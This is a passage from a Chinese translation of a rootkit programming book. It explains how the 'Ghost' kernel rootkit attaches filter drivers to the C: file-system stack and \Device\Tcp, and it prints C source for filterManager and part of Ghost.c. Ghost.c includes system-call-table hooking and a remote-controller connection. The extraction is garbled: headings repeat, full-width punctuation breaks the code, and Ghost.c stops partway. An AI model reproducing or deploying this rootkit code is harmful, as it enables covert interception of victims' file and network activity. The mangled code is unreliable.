由
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ServiceGroupOrder\List 的值
来决定。如果你打开注册表查看这个值，你会看到这是一个 REG_MULTI_SZ 类型的值。
（注:下面两张图是译者加入的）
这里面包含了几十组的值。要进行文件系统过滤，必须要把一个过滤驱动插入到 “FSFilter
Bottom” 组的后面。要想进行更多的过滤， 在“Filter”组后面插入自己的过滤驱动就行了。
这样即使是高级的网络过滤也没问题，因为 TCP，UDP 和 Raw IP 这些驱动是在普通的驱
动之前被加载的。
虽然在本章里谈到的网络过滤驱动可以作为一个 on-demand 设备驱动被加载和卸载，但是
我们的主要目的不是卸载。要注意的是，在卸载网络过滤驱动之前必须要保证所有在安装了
该过滤驱动之后打开的网络连接都已经被关闭，这是因为网络过滤栈上任何一个过滤器都有
可能引用了该网络过滤驱动，直接卸载该过滤驱动很可能会导致系统崩溃，因此在卸载笫 7
章的 rootkit 之前必须把所有在安装该 rootkit 之后打开的网络软件都关闭掉。另外，为了便
于进行 rotokit 加载和卸载，本书剩下的代码例子将会跳过(或注释掉)网络过滤驱动部分。
文件系统过滤驱动
文件系统过滤驱动可以插入到以
“\\DosDevices\\X:\\” 作设备名的所有驱动或者其中的一
个驱动中。其中 X 是目标设备所在的驱动器号。这种文件过滤驱动所使用的技术和网络过
滤驱动稍有不同，网络过滤驱动可以使用 IoAttachDevice 函数来附加到 “\\Device\\Tcp”，
“\\Device\\Udp”
或 者
“\\Device\\RawIP” 上 ，
而 文 件 过 滤 驱 动 必 须 使 用
IoAttachDeviceToDeviceStack 以保证能够正确地插入到设备栈中。
要注意的是在版本比较老的 DDK 里， IoAttachDeviceToDeviceStack 会有一些 BUG 可能会
导致系统崩溃，所以我们要尽量使用新版的 IoAttachDeviceToDevice StackSafe 函数。在本
书中，因为使用 IoAttachDeviceToDeviceStack 函数能减少在链接时产生“unknown external
function”错误的可能性，所以本书代码使用了这个老版本的函数(虽然新版的函数在这里也
以很好的工作)，如果使用的是新版本的 DKK 来编译可以简单的把旧版本的函数注释掉然后
把新版本的函数加进来。图 7-1 显示了文件系统过滤的结构。
Figure
Figure
Figure
Figure 7-1
7-1
7-1
7-1
在正常情况下，文件过滤驱动会附加到所有已经挂载的磁盘上，这就要求过滤器跟踪哪个新
的设备附加到了哪个驱动栈上。为了帮助驱动来进行跟踪，设备可以预留一个设备扩展空间，
设备扩展是由用户指定的一个数据结构，它会随着 I/O 请求包一起传递，创建一个包含
“PDEVICE_OBJECT AttachedToDeviceObject”成员的设备扩展可以解决究竟是哪个驱动附
加到了哪个设备的难题，但是本书中的 rootkit 只会监视 C 盘，所以这里不需要用到设备扩
展。
另一个对于文件系统过滤需要关心的是快速 I/O。文件系统过滤器要依赖于快速 I/O，就像
依赖传统的 I/O 请求包一样，快速 I/O 调用是为了在文件缓存中进行快速同步 I/O 操作而设
计的，在文件过滤器中它必须要被设置好。最低限度地，rootkit 为在 ntddk.h 中定义的 21
个快速分发例程提供了连接接口。本书附带的源码镜像里实现的所有有快速 I/O 连接接口
都通过一个可以用来动态地对快速 I/O 文件进行监视的 filterFastIo 函数把活动文件对象收集
起来。
网络过滤驱动
正如上面所说的，网络过滤驱动的插入要比文件过滤驱动的插入简单一些，我们要做的只是
创建一个新的设备并把它附加到一个现存的网络设备栈中。虽然本章中的例子保是附加了
“\\Device\\Tcp”， 但我们同样可以很容易地附加到其它的任何一个网络设备栈上。网络过滤
器如图 7-2 所示
7-2
7-2
7-2
7-2
综合式过滤驱动
由前面两个分离的过滤驱动可以看到，我们可能同时需要这两个驱动，但事实上并非如此。
本章中的 rootkit 会使用在笫 5 章中所编写的分发例程来同时监视别的程序发出的命令和为
过滤设备而设计的 I/O 请求包，这样使得在一个 rootkit 内可以很方便地同时包含文件过滤器
和网络过滤器，综合式过滤器如图 7-3 所示
7-3
7-3
7-3
7-3
因为分发例程已经添加到 rootkit 里，截获 I/O 请求包的机制已经有了，剩下要做的就是把一
个新创建的设备插入到一个现存的设备栈中、为文件系统过滤提供快速 I/O 例程、增加派遣
例程的截获数量并且在 OnDispatch 例程里进行处理。
要进行彻底的过滤，就要把所有的派遣例程都路由到 OnDispatch 例程里，这是通过在
DriverEntty 里 用 一 个 for 循 环 来 把 所 有 的 派 遣 例 程 注 册 为 OnDispatch （ 从 0 到
IRP_MJ_MAXIMUM_FUNCTION)来实现的。因此，OnDispatch 例程不仅要修改需要处理
的 I/O 请求包，还要让那不需要进行处理的 I/O 请求包正常地通过。
一个实例
为了给 rootkit 增加网络过滤和文件过滤功能，需要修改四个文件并且要创建两个新文件。
新 文 件 是 filterManager.h 和 filterManager.c 。 要 修 改 的 文 件 是 Ghost.c ， IoManager.c ，
IoManager.h，和 SOURCES。
新文件如下:
filterManager.c
filterManager.H
需要修改的文件如下:
Ghost.c
IoManager.c
IoManager.h
SOURCES
下面是代码:
filterManager
filterManager
filterManager
filterManager。hhhh
文件 filterManager.h 简单的定义了三个函数，这三个函数都在 filterManager.c 里面实现。
// Copyright Ric Vieler， 2006
// Support header for filterManager.c
#ifndef _FILTER_MANAGER_H_
#define _FILTER_MANAGER_H_
NTSTATUS insertFileFilter(PDRIVER_OBJECT pDriverObject，
PDEVICE_OBJECT* ppOldDevice，
PDEVICE_OBJECT* ppNewDevice，
wchar_t* deviceName);
NTSTATUS insertNetworkFilter(PDRIVER_OBJECT pDriverObject，
PDEVICE_OBJECT* ppOldDevice，
PDEVICE_OBJECT* ppNewDevice，
wchar_t* deviceName);
void removeFilter(PDEVICE_OBJECT* ppOldDevice，
PDEVICE_OBJECT* ppNewDevice);
#endif
filterManager
filterManager
filterManager
filterManager.c.c.c.c
filterManager.c 实现了下面的函数:
insertFileFilter - 用来插入文件系统过滤器
insertNetworkFilter - 用来插入网络过滤器
removeFilter - 用来移除网络和文件过滤器
// filterManager
// Copyright Ric Vieler， 2006
// Attach to file and network drivers
#include "ntddk。h"
#include "Ghost。h"
#include "filterManager。h"
NTSTATUS insertFileFilter(PDRIVER_OBJECT pDriverObject，
PDEVICE_OBJECT* ppOldDevice，
PDEVICE_OBJECT* ppNewDevice，
wchar_t* deviceName)
{
NTSTATUS status;
UNICODE_STRING unicodeDeviceName;
HANDLE fileHandle;
IO_STATUS_BLOCK statusBlock = { 0 };
OBJECT_ATTRIBUTES objectAttributes = { 0 };
PFILE_OBJECT fileObject;
// Get the device for the specified drive
RtlInitUnicodeString( &unicodeDeviceName， deviceName );
InitializeObjectAttributes( &objectAttributes，
&unicodeDeviceName，
OBJ_CASE_INSENSITIVE，
NULL，
NULL );
status = ZwCreateFile( &fileHandle，
SYNCHRONIZE|FILE_ANY_ACCESS，
&objectAttributes，
&statusBlock，
NULL，
0，
FILE_SHARE_READ | FILE_SHARE_WRITE，
FILE_OPEN，
FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE，
NULL，
0 );
if( !NT_SUCCESS( status ) )
return status;
status = ObReferenceObjectByHandle( fileHandle，
FILE_READ_DATA，
NULL，
KernelMode，
(PVOID *)&fileObject，
NULL );
if( !NT_SUCCESS( status ) )
{
ZwClose( fileHandle );
return status;
}
*ppOldDevice = IoGetRelatedDeviceObject( fileObject );
if( !*ppOldDevice )
{
ObDereferenceObject( fileObject );
ZwClose( fileHandle );
return STATUS_ABANDONED;
}
// Create a new device
status = IoCreateDevice( pDriverObject，
0，
NULL，
(*ppOldDevice)->DeviceType，
0，
FALSE，
ppNewDevice );
if( !NT_SUCCESS( status ) )
{
ObDereferenceObject( fileObject );
ZwClose( fileHandle );
return status;
}
// Initialize the new device
if( (*ppOldDevice)->Flags & DO_BUFFERED_IO )
(*ppNewDevice)->Flags |= DO_BUFFERED_IO;
if( (*ppOldDevice)->Flags & DO_DIRECT_IO )
(*ppNewDevice)->Flags |= DO_DIRECT_IO;
if( (*ppOldDevice)->Characteristics & FILE_DEVICE_SECURE_OPEN )
(*ppNewDevice)->Characteristics |= FILE_DEVICE_SECURE_OPEN;
// Attach the new device to the old device
// status = IoAttachDeviceToDeviceStackSafe( *ppNewDevice， *ppOldDevice，
ppOldDevice );
*ppOldDevice = IoAttachDeviceToDeviceStack( *ppNewDevice， *ppOldDevice );
if( *ppOldDevice == NULL )
{
// Prevent unload if load failed
IoDeleteDevice( *ppNewDevice );
*ppNewDevice = NULL;
// Clean up and return error
ObDereferenceObject( fileObject );
ZwClose( fileHandle );
return STATUS_NO_SUCH_DEVICE;
}
ObDereferenceObject( fileObject );
ZwClose( fileHandle );
return STATUS_SUCCESS;
}
NTSTATUS insertNetworkFilter(PDRIVER_OBJECT pDriverObject，
PDEVICE_OBJECT* ppOldDevice，
PDEVICE_OBJECT* ppNewDevice，
wchar_t* deviceName)
{
NTSTATUS status = STATUS_SUCCESS;
UNICODE_STRING unicodeName = { 0 };
// Create a new device
status = IoCreateDevice( pDriverObject，
0，
NULL，
FILE_DEVICE_UNKNOWN，
0，
TRUE，
ppNewDevice );
if( !NT_SUCCESS( status ) )
return status;
// Initialize the new device
((PDEVICE_OBJECT)(*ppNewDevice))->Flags |= DO_DIRECT_IO;
// Attach the new device
RtlInitUnicodeString( &unicodeName， deviceName );
status = IoAttachDevice( *ppNewDevice，
&unicodeName，
ppOldDevice );
// Prevent unload if load failed
if( !NT_SUCCESS( status ) )
{
IoDeleteDevice( *ppNewDevice );
*ppNewDevice = NULL;
}
return status;
}
void removeFilter(PDEVICE_OBJECT* ppOldDevice，
PDEVICE_OBJECT* ppNewDevice)
{
IoDetachDevice( *ppOldDevice );
IoDeleteDevice( *ppNewDevice );
}
在这三个函数里，insertFileFilter 需要的解释的地方最多。因为 insertNetworkFilter 是
insertFileFilter 的简化版本，而 removeFilter 仅仅只有两行代码。
函数 insertFileFilter 需要两个指向指针的指针和一个设备名作为参数。其实我也不怎么喜欢
指向指针的指针，但没办法，因为这是 C 语言，它没有引用操作符。不管怎么样，该指针
指向的是设备对象的指针，一个是用来保存新创建的设备对象，另一个是要附加到的目标对
象。一旦新创建的设备附加到了现存的设备里，用来创建新设备的驱动对象的 I/O 映射
(pDriverObject-> MajorFunction[]) 将开始最先收到要发送给设备的 IRP。
Ghost
Ghost
Ghost
Ghost.c.c.c.c
Ghost.c 经过修改后提供了性能更好的过滤功能。这里增加了 4 个新的设备指针:
oldFileSysDevice
newFileSysDevice
oldNetworkDevice
newNetworkDevice
这些设备指针将会由在 DriverEntry 里调用的 insertFileFilter 和 insertNetworkFilter 来进行初
始化，并且会在 OnUnload 中调用 removeFilter 来释放。
另外，所有在 pDriverObject->MajorFunction 数组里的派遣例程指针都被设置成 OnDispatch，
pDriverObject->FastIoDispatch 成员被设置成一个新创建的分发函数。
下面是代码:
// Ghost
// Copyright Ric Vieler， 2006
#include "ntddk。h"
#include "Ghost。h"
#include "fileManager。h"
#include "configManager。h"
#include "hookManager。h"
#include "IoManager。h"
#include "commManager。h"
#include "filterManager。h"
#pragma code_seg()
// Global version data
ULONG majorVersion;
ULONG minorVersion;
// Global base address
PVOID kernel32Base = NULL;
// Global state data
BOOL allowEncryption = TRUE;
// Global devices
PDEVICE_OBJECT oldFileSysDevice = NULL;
PDEVICE_OBJECT newFileSysDevice = NULL;
PDEVICE_OBJECT oldNetworkDevice = NULL;
PDEVICE_OBJECT newNetworkDevice = NULL;
// Used to circumvent memory protected System Call Table
PVOID* NewSystemCallTable = NULL;
PMDL pMyMDL = NULL;
// Pointer(s) to original function(s) - before hooking
ZWMAPVIEWOFSECTION OldZwMapViewOfSection;
ZWPROTECTVIRTUALMEMORY OldZwProtectVirtualMemory;
VOID OnUnload( IN PDRIVER_OBJECT pDriverObject )
{
UNICODE_STRING deviceLink = { 0 };
PFAST_IO_DISPATCH pFastIoDispatch;
// remove filters
if( newFileSysDevice )
removeFilter( &oldFileSysDevice， &newFileSysDevice );
if( newNetworkDevice )
removeFilter( &oldNetworkDevice， &newNetworkDevice );
// free fast I/O resource
pFastIoDispatch = pDriverObject->FastIoDispatch;
pDriverObject->FastIoDispatch = NULL;
if( pFastIoDispatch )
ExFreePool( pFastIoDispatch );
// Close the connection to remote controller
CloseTDIConnection();
// remove device controller
RtlInitUnicodeString( &deviceLink， GHOST_DEVICE_LINK_NAME );
IoDeleteSymbolicLink( &deviceLink );
IoDeleteDevice( theDriverObject->DeviceObject );
DbgPrint("comint32: Device controller removed。");
// Unhook any hooked functions and return the Memory Descriptor List
if( NewSystemCallTable )
{
UNHOOK( ZwMapViewOfSection， OldZwMapViewOfSection );
MmUnmapLockedPages( NewSystemCallTable， pMyMDL );
IoFreeMdl( pMyMDL );
}
DbgPrint("comint32: Hooks removed。");
}
NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject， IN PUNICODE_STRING
theRegistryPath )
{
int loop;
DRIVER_DATA* driverData;
UNICODE_STRING deviceName = { 0 };
UNICODE_STRING deviceLink = { 0 };
PDEVICE_OBJECT pDeviceController;
PFAST_IO_DISPATCH pFastIoDispatch;
char operatingSystem[10];
// Get the operating system version
PsGetVersion( &majorVersion， &minorVersion， NULL， NULL );
// Major = 4: Windows NT 4。0， Windows Me， Windows 98 or Windows 95
// Major = 5: Windows Server 2003， Windows XP or Windows 2000
// Minor = 0: Windows 2000， Windows NT 4。0 or Windows 95